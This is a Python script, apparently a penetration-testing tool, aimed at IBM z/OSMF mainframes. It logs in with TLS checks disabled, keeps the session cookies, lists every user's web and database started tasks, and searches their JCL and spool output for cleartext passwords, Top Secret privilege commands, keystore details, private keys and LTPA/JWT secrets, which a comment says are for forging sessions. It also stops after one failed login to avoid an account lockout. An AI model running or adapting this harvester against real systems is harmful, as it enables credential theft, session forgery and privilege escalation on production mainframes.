#!/usr/bin/env python3
import base64, getpass, json, re, ssl, sys
import urllib.request, urllib.parse, urllib.error, http.cookiejar

HOST = sys.argv[1]                       # ex: https://zosmf.client.local
USER = sys.argv[2]
PWD  = getpass.getpass("Mot de passe : ")
KW = re.compile(
    # --- identifiants en clair ---
    r"PASS|PWD|PW=|SIGNON|USING|PHRASE\(|-u |PASSWORD\(|DATA\(PASSWORD|PWVIEW"
    # --- Top Secret : admin, privilèges, violations ---
    r"|TSS +(CRE|CREATE|ADD|REP|REPLACE|MODIFY|LIST|WHOHAS|WHOOWNS)\("
    r"|\b(MSCA|SCA|ZCA|VCA|LSCA|DCA)\b"
    r"|NODSNCHK|NORESCHK|NOVOLCHK|NOSUBCHK|NOLCFCHK|BYPASS|TSS7\d{3}E"
    # --- keystores / keyrings / certificats ---
    r"|KEYSTORE|KEYRING|TRUSTSTORE|\.p12\b|\.jks\b|\.kdb\b|\.racf\b|\.sth\b"
    r"|SAFKEYRING|keyring:|CERTIFICATE|CERTAUTH|PERSONAL|KEYLABEL|KEYLAB"
    # --- clés et jetons (forge de session) ---
    r"|LTPA|ltpaKeys|JWT|jwtToken|jwk|SECRET|private[_ ]?key|BEGIN (RSA |EC )?PRIVATE"
    # --- config TLS / Liberty / AT-TLS ---
    r"|SSLCONFIG|AT-TLS|TLSV1|SSLV3|ENABLEDCIPHERS|sslProtocol|clientAuthentication"
    r"|<ssl |<keyStore|<webAppSecurity|unauthenticatedUser|SAF(UNAUTH|CRED)"
    # --- erreurs TLS/SAF souvent révélatrices ---
    r"|CWPKI|CWWKS|CWWKO|SSL0|GSK_", re.I)

# TLS sans vérification + gestion des cookies (jwtToken / LtpaToken2)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=ctx))
BASIC = "Basic " + base64.b64encode(f"{USER}:{PWD}".encode()).decode()

def call(path, method="GET", params=None, basic=False):
    url = HOST + path + ("?" + urllib.parse.urlencode(params) if params else "")
    req = urllib.request.Request(url, method=method,
                                 data=b"" if method == "POST" else None)
    req.add_header("X-CSRF-ZOSMF-HEADER", "x")
    if basic:
        req.add_header("Authorization", BASIC)
    with opener.open(req, timeout=60) as r:
        return r.read().decode("utf-8", errors="replace")

# Authentification unique : on s'arrête dès le premier échec pour ne pas risquer un REVOKE
try:
    call("/zosmf/services/authenticate", method="POST", basic=True)
except urllib.error.HTTPError as e:
    if e.code != 404:
        sys.exit(f"[!] Echec auth : HTTP {e.code} - on arrete")
    # z/OSMF < 2.4 : une requête authentifiée suffit pour obtenir LtpaToken2
    try:
        call("/zosmf/restjobs/jobs", params={"max-jobs": 1}, basic=True)
    except urllib.error.HTTPError as e2:
        sys.exit(f"[!] Echec auth (fallback) : HTTP {e2.code} - on arrete")

names = [c.name for c in cj]
print("[+] Cookies :", names, file=sys.stderr)
if not names:
    sys.exit("[!] Aucun cookie de session recu - on arrete")
STC_PREFIXES = ("IZU", "CEA", "CICS", "IHS", "HTTPD", "DB2", "IMS")
q = urllib.parse.quote  # noms de jobs avec $, #, @
jobs = json.loads(call("/zosmf/restjobs/jobs",
                       params={"owner": "*", "prefix": "*", "max-jobs": 5000}))
jobs = [j for j in jobs if j["jobname"].startswith(STC_PREFIXES)]
print(f"[+] {len(jobs)} started tasks web retenues", file=sys.stderr)


for j in jobs:
    base = f"/zosmf/restjobs/jobs/{q(j['jobname'])}/{q(j['jobid'])}"
    try:
        files = json.loads(call(f"{base}/files"))
        sources = [("JCL", f"{base}/files/JCL/records")] + \
                  [(f["ddname"], f"{base}/files/{f['id']}/records") for f in files]
        for dd, path in sources:
            for line in call(path).splitlines():
                if KW.search(line):
                    print(f"{j['jobname']}/{j['jobid']}/{dd}: {line.strip()}")
    except urllib.error.HTTPError as e:
        print(f"[-] {j['jobname']}/{j['jobid']} : HTTP {e.code}", file=sys.stderr)
